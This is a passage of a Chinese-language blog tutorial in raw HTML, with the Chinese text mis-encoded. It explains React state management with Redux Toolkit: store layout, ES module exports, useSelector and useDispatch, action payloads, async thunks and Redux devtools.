src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.06.12.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> ajv@latest ajv-keywords@latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>æˆåŠŸå¯åŠ¨é¡¹ç›®ï¼š</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.08.03.png" style="zoom:50%;"><h4 id="3ï¼‰storeç›®å½•ç»“æ„è®¾è®¡"><a href="#3ï¼‰storeç›®å½•ç»“æ„è®¾è®¡" class="headerlink" title="3ï¼‰storeç›®å½•ç»“æ„è®¾è®¡"></a>3ï¼‰storeç›®å½•ç»“æ„è®¾è®¡</h4><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.10.12.png" style="zoom:50%;"><ol><li>é€šå¸¸é›†ä¸­çŠ¶æ€ç®¡ç†çš„éƒ¨åˆ†éƒ½ä¼šå•ç‹¬åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„ <code>store</code> ç›®å½•ã€‚</li><li>åº”ç”¨é€šå¸¸ä¼šæœ‰å¾ˆå¤šä¸ªå­storeæ¨¡å—ï¼Œæ‰€ä»¥åˆ›å»ºä¸€ä¸ª <code>modules</code> ç›®å½•ï¼Œåœ¨å†…éƒ¨ç¼–å†™ä¸šåŠ¡åˆ†ç±»çš„å­storeã€‚</li><li>storeä¸­çš„å…¥å£æ–‡ä»¶ index.js çš„ä½œç”¨æ˜¯ç»„åˆmodulesä¸­æ‰€æœ‰çš„å­æ¨¡å—ï¼Œå¹¶å¯¼å‡ºstoreã€‚</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-06%2018.13.13.png" style="zoom:50%;"><h3 id="14-2-2-Reduxä¸React-å®ç°counter"><a href="#14-2-2-Reduxä¸React-å®ç°counter" class="headerlink" title="14.2.2 Reduxä¸React - å®ç°counter"></a>14.2.2 Reduxä¸React - å®ç°counter</h3><h4 id="1ï¼‰æ•´ä½“è·¯å¾„"><a href="#1ï¼‰æ•´ä½“è·¯å¾„" class="headerlink" title="1ï¼‰æ•´ä½“è·¯å¾„"></a>1ï¼‰æ•´ä½“è·¯å¾„</h4><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-07%2017.22.35.png" style="zoom:30%;"><h4 id="2ï¼‰æ­¥éª¤"><a href="#2ï¼‰æ­¥éª¤" class="headerlink" title="2ï¼‰æ­¥éª¤"></a>2ï¼‰æ­¥éª¤</h4><ul><li>1ï¼‰ä½¿ç”¨React Toolkit åˆ›å»º counterStore</li></ul><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-07%2017.28.08.png" style="zoom:100%;"><blockquote><h3 id="é»˜è®¤å¯¼å‡ºå’Œå‘½åå¯¼å‡º"><a href="#é»˜è®¤å¯¼å‡ºå’Œå‘½åå¯¼å‡º" class="headerlink" title="é»˜è®¤å¯¼å‡ºå’Œå‘½åå¯¼å‡º"></a>é»˜è®¤å¯¼å‡ºå’Œå‘½åå¯¼å‡º</h3><p>åœ¨ JavaScript çš„æ¨¡å—ç³»ç»Ÿä¸­ï¼Œå¯¼å‡ºï¼ˆexportï¼‰å’Œå¯¼å…¥ï¼ˆimportï¼‰å…è®¸ä½ å°†ä»£ç åˆ†å‰²æˆä¸åŒçš„æ¨¡å—ï¼Œç„¶ååœ¨éœ€è¦çš„åœ°æ–¹é‡ç”¨å®ƒä»¬ã€‚æ¨¡å—å¯ä»¥æœ‰å‘½åå¯¼å‡ºï¼ˆnamed exportsï¼‰å’Œé»˜è®¤å¯¼å‡ºï¼ˆdefault exportï¼‰ã€‚</p><ul><li>é»˜è®¤å¯¼å‡ºï¼ˆDefault Exportï¼‰</li></ul><p>é»˜è®¤å¯¼å‡ºæ˜¯æ¨¡å—çš„ä¸»è¦å†…å®¹æˆ–æœ€å¸¸ç”¨çš„éƒ¨åˆ†ã€‚ä¸€ä¸ªæ¨¡å—åªèƒ½æœ‰ä¸€ä¸ªé»˜è®¤å¯¼å‡ºã€‚é»˜è®¤å¯¼å‡ºå¯ä»¥ç”¨ä»»ä½•æœ‰æ•ˆçš„æ ‡è¯†ç¬¦å‘½åï¼Œå½“å¯¼å…¥æ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»»ä½•åç§°æ¥å¼•ç”¨å®ƒã€‚</p><p><strong>ç¤ºä¾‹ï¼šé»˜è®¤å¯¼å‡º</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// module.js</span><span class="token keyword">const</span> <span class="token function-variable function">someFunction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'This is a function from a module.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> someFunction<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å¯¼å…¥é»˜è®¤å¯¼å‡º</strong></p><p>javascript</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// anotherFile.js</span><span class="token keyword">import</span> myFunction <span class="token keyword">from</span> <span class="token string">'./module.js'</span><span class="token punctuation">;</span><span class="token function">myFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This is a function from a module.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>å‘½åå¯¼å‡ºï¼ˆNamed Exportsï¼‰</li></ul><p>å‘½åå¯¼å‡ºå…è®¸æ¨¡å—å¯¼å‡ºå¤šä¸ªå€¼ï¼ˆå‡½æ•°ã€å¯¹è±¡æˆ–å˜é‡ï¼‰ï¼Œæ¯ä¸ªå€¼éƒ½æœ‰ä¸€ä¸ªåç§°ã€‚ä¸€ä¸ªæ¨¡å—å¯ä»¥æœ‰å¤šä¸ªå‘½åå¯¼å‡ºã€‚</p><p><strong>ç¤ºä¾‹ï¼šå‘½åå¯¼å‡º</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// module.js</span><span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">someFunction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'This is a function from a module.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">anotherFunction</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'This is another function from the same module.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">const</span> someValue <span class="token operator">=</span> <span class="token string">'This is a value from a module.'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å¯¼å…¥å‘½åå¯¼å‡º</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// anotherFile.js</span><span class="token keyword">import</span> <span class="token punctuation">{</span> someFunction<span class="token punctuation">,</span> anotherFunction<span class="token punctuation">,</span> someValue <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./module.js'</span><span class="token punctuation">;</span><span class="token function">someFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This is a function from a module.</span><span class="token function">anotherFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This is another function from the same module.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>someValue<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This is a value from a module.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><ul><li>2ï¼‰ä¸ºReactæ³¨å…¥store</li></ul><p>react-reduxè´Ÿè´£æŠŠReduxå’ŒReact é“¾æ¥ èµ·æ¥ï¼Œå†…ç½® Providerç»„ä»¶ é€šè¿‡ store å‚æ•°æŠŠåˆ›å»ºå¥½çš„storeå®ä¾‹æ³¨å…¥åˆ°åº”ç”¨ä¸­ ï¼Œé“¾æ¥æ­£å¼å»ºç«‹ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-07%2017.27.39.png" style="zoom:50%;"><ul><li>3ï¼‰Reactç»„ä»¶ä½¿ç”¨storeä¸­çš„æ•°æ®</li></ul><p>åœ¨Reactç»„ä»¶ä¸­ä½¿ç”¨storeä¸­çš„æ•°æ®ï¼Œéœ€è¦ç”¨åˆ°ä¸€ä¸ª é’©å­å‡½æ•° - useSelectorï¼Œå®ƒçš„ä½œç”¨æ˜¯æŠŠstoreä¸­çš„æ•°æ®æ˜ å°„åˆ°ç»„ä»¶<br>ä¸­ï¼Œä½¿ç”¨æ ·ä¾‹å¦‚ä¸‹ï¼š</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-07%2017.29.46.png" style="zoom:40%;"><blockquote><p><code>useSelector</code> æ˜¯ä¸€ä¸ª React Hookï¼Œç”¨äºåœ¨ React ç»„ä»¶ä¸­è¯»å– Redux store ä¸­çš„çŠ¶æ€ã€‚å®ƒä¾èµ–äºå·²ç»åˆ›å»ºå¥½çš„ store æ¥è·å–çŠ¶æ€æ•°æ®ã€‚åœ¨ç»„ä»¶ä¸­ä½¿ç”¨ <code>useSelector</code> æ—¶ï¼Œå®ƒä¼šè®¢é˜… store çš„å˜åŒ–ï¼Œå¹¶åœ¨çŠ¶æ€æ›´æ–°æ—¶é‡æ–°è®¡ç®—é€‰æ‹©å™¨å‡½æ•°çš„ç»“æœï¼Œä»è€Œè§¦å‘ç»„ä»¶çš„æ›´æ–°ã€‚</p><p>const {count} = useSelector(store=&gt;store.counter) </p><p>è¿™æ®µä»£ç ä½¿ç”¨äº† Redux Toolkit ä¸­çš„ <code>useSelector</code> Hookï¼Œå…¶ä½œç”¨æ˜¯ä» Redux store ä¸­æå– <code>counter</code> éƒ¨åˆ†çš„çŠ¶æ€ï¼Œå¹¶å°†å…¶è§£æ„ä»¥è·å– <code>count</code> å±æ€§çš„å€¼ã€‚</p><ul><li><code>useSelector</code> æ˜¯ä¸€ä¸ª React Hookï¼Œå®ƒå…è®¸ä½ ä» Redux store çš„çŠ¶æ€æ ‘ä¸­è¯»å–æ•°æ®ã€‚</li><li><code>store =&gt; store.counter</code> æ˜¯ä¼ é€’ç»™ <code>useSelector</code> çš„é€‰æ‹©å™¨å‡½æ•°ï¼ˆselector functionï¼‰ã€‚è¿™ä¸ªå‡½æ•°æ¥æ”¶æ•´ä¸ª Redux store çš„çŠ¶æ€æ ‘ä½œä¸ºå‚æ•°ï¼Œç„¶åè¿”å›ä½ æƒ³è¦çš„éƒ¨åˆ†ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒè¿”å›äº† <code>counter</code> è¿™ä¸ªå­çŠ¶æ€ã€‚</li><li><code>const { count } = ...</code> æ˜¯ JavaScript çš„è§£æ„èµ‹å€¼è¯­æ³•ã€‚å®ƒä» <code>useSelector</code> è¿”å›çš„å¯¹è±¡ä¸­æå– <code>count</code> å±æ€§ï¼Œå¹¶å°†å…¶èµ‹å€¼ç»™ä¸€ä¸ªåä¸º <code>count</code> çš„å¸¸é‡ã€‚</li></ul></blockquote><ul><li>4ï¼‰Reactç»„ä»¶ä¿®æ”¹storeä¸­çš„æ•°æ®</li></ul><p>Reactç»„ä»¶ä¸­ä¿®æ”¹storeä¸­çš„æ•°æ®éœ€è¦å€ŸåŠ©å¦å¤–ä¸€ä¸ªhookå‡½æ•° - useDispatchï¼Œå®ƒçš„ä½œç”¨æ˜¯ç”Ÿæˆæäº¤actionå¯¹è±¡çš„ dispatchå‡½æ•°ï¼Œä½¿ç”¨æ ·ä¾‹å¦‚ä¸‹ï¼š</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-07%2017.31.22.png" a="" style="zoom:50%;"><blockquote><h3 id="è§£æƒ‘-ã€Œä¸ºä»€ä¹ˆéœ€è¦-ï¼Œä¸èƒ½ç›´æ¥dispatch-decrement-è¿™æ ·è°ƒç”¨å—ï¼Ÿã€"><a href="#è§£æƒ‘-ã€Œä¸ºä»€ä¹ˆéœ€è¦-ï¼Œä¸èƒ½ç›´æ¥dispatch-decrement-è¿™æ ·è°ƒç”¨å—ï¼Ÿã€" class="headerlink" title="è§£æƒ‘-ã€Œä¸ºä»€ä¹ˆéœ€è¦()=>ï¼Œä¸èƒ½ç›´æ¥dispatch(decrement())è¿™æ ·è°ƒç”¨å—ï¼Ÿã€"></a>è§£æƒ‘-ã€Œä¸ºä»€ä¹ˆéœ€è¦()=&gt;ï¼Œä¸èƒ½ç›´æ¥dispatch(decrement())è¿™æ ·è°ƒç”¨å—ï¼Ÿã€</h3><p>ä½¿ç”¨ç®­å¤´å‡½æ•°çš„åŸå› </p><ul><li><strong>å»¶è¿Ÿæ‰§è¡Œ</strong>ï¼šé€šè¿‡ä½¿ç”¨ç®­å¤´å‡½æ•° <code>() =&gt; dispatch(decrement())</code>ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å‡½æ•°å®ä¾‹ã€‚è¿™ä¸ªå‡½æ•°åœ¨ç»„ä»¶æ¸²æŸ“æ—¶ä¸ä¼šè¢«è°ƒç”¨ï¼Œè€Œæ˜¯åœ¨äº‹ä»¶å‘ç”Ÿæ—¶æ‰è¢«è°ƒç”¨ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿ <code>dispatch(decrement())</code> åªåœ¨ç”¨æˆ·ç‚¹å‡»æŒ‰é’®æ—¶æ‰§è¡Œã€‚å¦‚æœç›´æ¥ä½¿ç”¨ <code>dispatch(decrement())</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªè¡¨è¾¾å¼ä¼šåœ¨ç»„ä»¶æ¸²æŸ“æ—¶ç«‹å³æ‰§è¡Œï¼Œè€Œä¸æ˜¯åœ¨äº‹ä»¶å‘ç”Ÿæ—¶æ‰§è¡Œã€‚è¿™æ˜¯å› ä¸º React ä¼šå°†ç»„ä»¶çš„ JSX è½¬æ¢ä¸º JavaScript å¯¹è±¡ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰éå‡½æ•°å¼•ç”¨çš„è¡¨è¾¾å¼éƒ½ä¼šè¢«æ±‚å€¼ã€‚</li><li><strong>æ§åˆ¶æ‰§è¡Œæ—¶æœº</strong>ï¼šç®­å¤´å‡½æ•°æä¾›äº†ä¸€ç§ç®€å•çš„æ–¹å¼æ¥å»¶è¿Ÿå‡½æ•°çš„æ‰§è¡Œï¼Œç›´åˆ°äº‹ä»¶å®é™…å‘ç”Ÿã€‚è¿™ç§æ–¹å¼åœ¨ React ä¸­éå¸¸å¸¸è§ï¼Œå› ä¸ºå®ƒæ˜¯æ§åˆ¶äº‹ä»¶å¤„ç†å™¨æ‰§è¡Œæ—¶æœºçš„æ ‡å‡†åšæ³•ã€‚</li></ul></blockquote><h4 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h4><ol><li>ç»„ä»¶ä¸­ä½¿ç”¨å“ªä¸ªhookå‡½æ•°è·å–storeä¸­çš„æ•°æ®ï¼ŸuseSelectorã€‚</li><li>ç»„ä»¶ä¸­ä½¿ç”¨å“ªä¸ªhookå‡½æ•°è·å–dispatchæ–¹æ³•ï¼ŸuseDispatchã€‚</li><li>å¦‚ä½•å¾—åˆ°è¦æäº¤actionå¯¹è±¡ï¼Ÿæ‰§è¡Œstoreæ¨¡å—ä¸­å¯¼å‡ºçš„actionCreateræ–¹æ³•ã€‚</li></ol><h2 id="14-3-æäº¤actionä¼ å‚"><a href="#14-3-æäº¤actionä¼ å‚" class="headerlink" title="14.3 æäº¤actionä¼ å‚"></a>14.3 æäº¤actionä¼ å‚</h2><h3 id="14-3-1-éœ€æ±‚è¯´æ˜"><a href="#14-3-1-éœ€æ±‚è¯´æ˜" class="headerlink" title="14.3.1 éœ€æ±‚è¯´æ˜"></a>14.3.1 éœ€æ±‚è¯´æ˜</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.13.24.png" style="zoom:50%;"><p>ç»„ä»¶ä¸­æœ‰ä¿©ä¸ªæŒ‰é’® <code>add to 10</code> å’Œ <code>add to 20</code> å¯ä»¥ç›´æ¥æŠŠcountå€¼ä¿®æ”¹åˆ°å¯¹åº”çš„æ•°å­—ï¼Œç›®æ ‡countå€¼æ˜¯åœ¨ç»„ä»¶ä¸­ä¼ é€’è¿‡å»çš„ï¼Œéœ€è¦åœ¨æäº¤actionçš„æ—¶å€™ä¼ é€’å‚æ•°ã€‚</p><h3 id="14-3-2-æäº¤actionä¼ å‚å®ç°éœ€æ±‚"><a href="#14-3-2-æäº¤actionä¼ å‚å®ç°éœ€æ±‚" class="headerlink" title="14.3.2 æäº¤actionä¼ å‚å®ç°éœ€æ±‚"></a>14.3.2 æäº¤actionä¼ å‚å®ç°éœ€æ±‚</h3><p>åœ¨reducersçš„åŒæ­¥ä¿®æ”¹æ–¹æ³•ä¸­æ·»åŠ actionå¯¹è±¡å‚æ•°ï¼Œåœ¨è°ƒç”¨actionCreaterçš„æ—¶å€™ä¼ é€’å‚æ•°ï¼Œå‚æ•°ä¼šè¢«ä¼ é€’åˆ°actionå¯¹è±¡payloadå±æ€§ä¸Šã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.14.45.png" style="zoom:50%;"><h2 id="14-3-å¼‚æ­¥çŠ¶æ€æ“ä½œ"><a href="#14-3-å¼‚æ­¥çŠ¶æ€æ“ä½œ" class="headerlink" title="14.3 å¼‚æ­¥çŠ¶æ€æ“ä½œ"></a>14.3 å¼‚æ­¥çŠ¶æ€æ“ä½œ</h2><h3 id="14-3-1-éœ€æ±‚ç†è§£"><a href="#14-3-1-éœ€æ±‚ç†è§£" class="headerlink" title="14.3.1 éœ€æ±‚ç†è§£"></a>14.3.1 éœ€æ±‚ç†è§£</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.15.46.png" style="zoom:50%;"><h3 id="14-3-2-å¼‚æ­¥æ“ä½œæ ·æ¿ä»£ç "><a href="#14-3-2-å¼‚æ­¥æ“ä½œæ ·æ¿ä»£ç " class="headerlink" title="14.3.2 å¼‚æ­¥æ“ä½œæ ·æ¿ä»£ç "></a>14.3.2 å¼‚æ­¥æ“ä½œæ ·æ¿ä»£ç </h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.16.29.png" style="zoom:80%;"><ol><li><p>åˆ›å»ºstoreçš„å†™æ³•ä¿æŒä¸å˜ï¼Œé…ç½®å¥½åŒæ­¥ä¿®æ”¹çŠ¶æ€çš„æ–¹æ³•</p></li><li><p>å•ç‹¬å°è£…ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨å‡½æ•°å†…éƒ¨returnä¸€ä¸ªæ–°å‡½æ•°ï¼Œåœ¨æ–°å‡½æ•°ä¸­</p><p>2.1 å°è£…å¼‚æ­¥è¯·æ±‚è·å–æ•°æ®</p><p>2.2 è°ƒç”¨åŒæ­¥actionCreaterä¼ å…¥å¼‚æ­¥æ•°æ®ç”Ÿæˆä¸€ä¸ªactionå¯¹è±¡ï¼Œå¹¶ä½¿ç”¨dispatchæäº¤</p></li><li><p>ç»„ä»¶ä¸­dispatchçš„å†™æ³•ä¿æŒä¸å˜</p></li></ol><blockquote><h3 id="è§£æƒ‘-ã€Œæ—¢ç„¶thunk-action-creatorå‡½æ•°é‡Œé¢å·²ç»è°ƒç”¨äº†dispatchï¼Œä¸ºä»€ä¹ˆè¿™é‡Œè¿˜éœ€è¦è°ƒç”¨ä¸€æ¬¡dispatch-fetchChannelList-ã€"><a href="#è§£æƒ‘-ã€Œæ—¢ç„¶thunk-action-creatorå‡½æ•°é‡Œé¢å·²ç»è°ƒç”¨äº†dispatchï¼Œä¸ºä»€ä¹ˆè¿™é‡Œè¿˜éœ€è¦è°ƒç”¨ä¸€æ¬¡dispatch-fetchChannelList-ã€" class="headerlink" title="è§£æƒ‘-ã€Œæ—¢ç„¶thunk action creatorå‡½æ•°é‡Œé¢å·²ç»è°ƒç”¨äº†dispatchï¼Œä¸ºä»€ä¹ˆè¿™é‡Œè¿˜éœ€è¦è°ƒç”¨ä¸€æ¬¡dispatch(fetchChannelList());ã€"></a>è§£æƒ‘-ã€Œæ—¢ç„¶thunk action creatorå‡½æ•°é‡Œé¢å·²ç»è°ƒç”¨äº†dispatchï¼Œä¸ºä»€ä¹ˆè¿™é‡Œè¿˜éœ€è¦è°ƒç”¨ä¸€æ¬¡dispatch(fetchChannelList());ã€</h3><p>åœ¨ä½¿ç”¨ Redux Thunk æ—¶ï¼Œ<code>dispatch(fetchChannelList())</code> è¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯å¯åŠ¨æ•´ä¸ªå¼‚æ­¥æµç¨‹ã€‚è™½ç„¶ <code>fetchChannelList</code> è¿™ä¸ª thunk action creator å‡½æ•°å†…éƒ¨ç¡®å®ä¼šè°ƒç”¨ <code>dispatch</code>ï¼Œä½†è¿™é‡Œçš„ <code>dispatch(fetchChannelList())</code> æ˜¯å¿…è¦çš„ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><h3 id="å¯åŠ¨å¼‚æ­¥æµç¨‹"><a href="#å¯åŠ¨å¼‚æ­¥æµç¨‹" class="headerlink" title="å¯åŠ¨å¼‚æ­¥æµç¨‹"></a>å¯åŠ¨å¼‚æ­¥æµç¨‹</h3><ul><li><strong>å¤–éƒ¨è§¦å‘</strong>ï¼š<code>dispatch(fetchChannelList())</code> æ˜¯ä»ç»„ä»¶æˆ–å…¶ä»–åœ°æ–¹æ˜¾å¼è°ƒç”¨çš„ï¼Œç”¨æ¥å¯åŠ¨å¼‚æ­¥æ“ä½œã€‚å®ƒå‘Šè¯‰ Redux storeï¼šâ€œæˆ‘æœ‰ä¸€ä¸ªå¼‚æ­¥æ“ä½œéœ€è¦æ‰§è¡Œï¼Œè¯·å¤„ç†å®ƒã€‚â€</li><li><strong>ä¸­é—´ä»¶ä»‹å…¥</strong>ï¼šå½“ <code>dispatch(fetchChannelList())</code> è¢«è°ƒç”¨æ—¶ï¼ŒRedux Thunk ä¸­é—´ä»¶ä¼šæ‹¦æˆªåˆ°è¿™ä¸ªæ“ä½œã€‚å®ƒè¯†åˆ«å‡º <code>fetchChannelList()</code> è¿”å›çš„æ˜¯ä¸€ä¸ªå‡½æ•°ï¼ˆthunk å‡½æ•°ï¼‰ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæ™®é€šçš„ action å¯¹è±¡ã€‚ç„¶åï¼Œthunk middleware è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¼ å…¥ <code>dispatch</code> å’Œ <code>getState</code>ã€‚</li><li><strong>å†…éƒ¨é€»è¾‘</strong>ï¼šåœ¨ <code>fetchChannelList</code> è¿”å›çš„ thunk å‡½æ•°å†…éƒ¨ï¼Œå¼‚æ­¥æ“ä½œï¼ˆå¦‚ API è¯·æ±‚ï¼‰è¢«æ‰§è¡Œã€‚åœ¨å¼‚æ­¥æ“ä½œå®Œæˆåï¼Œå†…éƒ¨çš„ <code>dispatch</code> è°ƒç”¨ç”¨æ¥åˆ†å‘ä¸€ä¸ªæˆ–å¤šä¸ª actionï¼Œä»¥æ›´æ–° Redux store çš„çŠ¶æ€ã€‚</li></ul><h3 id="ä¸ºä»€ä¹ˆéœ€è¦å¤–éƒ¨çš„-dispatchï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆéœ€è¦å¤–éƒ¨çš„-dispatchï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦å¤–éƒ¨çš„ dispatchï¼Ÿ"></a>ä¸ºä»€ä¹ˆéœ€è¦å¤–éƒ¨çš„ <code>dispatch</code>ï¼Ÿ</h3><ul><li><strong>ç¬¦åˆ Redux çš„è®¾è®¡</strong>ï¼šRedux çš„è®¾è®¡è¦æ±‚æ‰€æœ‰çš„çŠ¶æ€æ›´æ–°éƒ½é€šè¿‡ <code>dispatch</code> action æ¥å®Œæˆã€‚å³ä½¿æ˜¯å¼‚æ­¥æ“ä½œï¼Œä¹Ÿéœ€è¦é€šè¿‡ <code>dispatch</code> æ¥è§¦å‘å’Œç®¡ç†ã€‚</li><li><strong>ä¸­é—´ä»¶çš„ä½œç”¨</strong>ï¼šRedux Thunk ä¸­é—´ä»¶æ˜¯è®¾è®¡æ¥å¤„ç†è¿™ç§æ¨¡å¼çš„ã€‚å®ƒç­‰å¾…å¤–éƒ¨çš„ <code>dispatch</code> è°ƒç”¨ï¼Œç„¶åå¤„ç†è¿”å›çš„å‡½æ•°ï¼ˆthunkï¼‰ã€‚å¦‚æœæ²¡æœ‰å¤–éƒ¨çš„ <code>dispatch</code>ï¼Œthunk middleware å°±æ— æ³•çŸ¥é“ä½•æ—¶å¯åŠ¨å¼‚æ­¥é€»è¾‘ã€‚</li><li><strong>ç»„ä»¶çš„æ§åˆ¶</strong>ï¼šåœ¨ç»„ä»¶ä¸­è°ƒç”¨ <code>dispatch(fetchChannelList())</code> å…è®¸ä½ æ§åˆ¶ä½•æ—¶å¯åŠ¨å¼‚æ­¥æ“ä½œã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½å¸Œæœ›åœ¨ç»„ä»¶åŠ è½½æ—¶ã€ç”¨æˆ·ç‚¹å‡»æŒ‰é’®æ—¶ï¼Œæˆ–è€…åœ¨ç‰¹å®šæ¡ä»¶æ»¡è¶³æ—¶æ‰å»è·å–æ•°æ®ã€‚</li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>**å¤–éƒ¨ <code>dispatch</code>**ï¼šå¯åŠ¨å¼‚æ­¥æµç¨‹ï¼Œè®© Redux Thunk ä¸­é—´ä»¶ä»‹å…¥å¹¶å¤„ç† thunk å‡½æ•°ã€‚</li><li>**å†…éƒ¨ <code>dispatch</code>**ï¼šåœ¨å¼‚æ­¥æ“ä½œå®Œæˆåï¼Œç”¨äºåˆ†å‘ action æ›´æ–° Redux store çš„çŠ¶æ€ã€‚</li></ul><p>è¿™ç§è®¾è®¡æ¨¡å¼ä½¿å¾—å¼‚æ­¥æ“ä½œçš„å¤„ç†æ›´åŠ æ¸…æ™°å’Œå¯æ§ï¼ŒåŒæ—¶ä¿æŒäº† Redux çŠ¶æ€ç®¡ç†çš„ä¸€è‡´æ€§å’Œå¯é¢„æµ‹æ€§ã€‚</p></blockquote><h3 id="14-3-3-Reduxè°ƒè¯•-devtools"><a href="#14-3-3-Reduxè°ƒè¯•-devtools" class="headerlink" title="14.3.3 Reduxè°ƒè¯• - devtools"></a>14.3.3 Reduxè°ƒè¯• - devtools</h3><p>å®‰è£…chromeè°ƒè¯•å·¥å…·ï¼š</p><p>Reduxå®˜æ–¹æä¾›äº†é’ˆå¯¹äºReduxçš„è°ƒè¯•å·¥å…·ï¼Œæ”¯æŒå®æ—¶stateä¿¡æ¯å±•ç¤ºï¼Œactionæäº¤ä¿¡æ¯æŸ¥çœ‹ç­‰ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2025-01-09%2011.21.06.png" style="zoom:50%;"><h2 id="14-4-ç¾å›¢å¤–å–æ¡ˆä¾‹"><a href="#14-4-ç¾å›¢å¤–å–æ¡ˆä¾‹" class="headerlink" title="14.4 ç¾å›¢å¤–å–æ¡ˆä¾‹"></a>14.4 ç¾å›¢å¤–å–æ¡ˆä¾‹</h2><h3 id="14-4-1-æ¡ˆä¾‹æ¼”ç¤ºå’Œç¯å¢ƒå‡†å¤‡"><a href="#14-4-1-æ¡ˆä¾‹æ¼”ç¤ºå’Œç¯å¢ƒå‡†å¤‡" class="headerlink" title="14.4.1 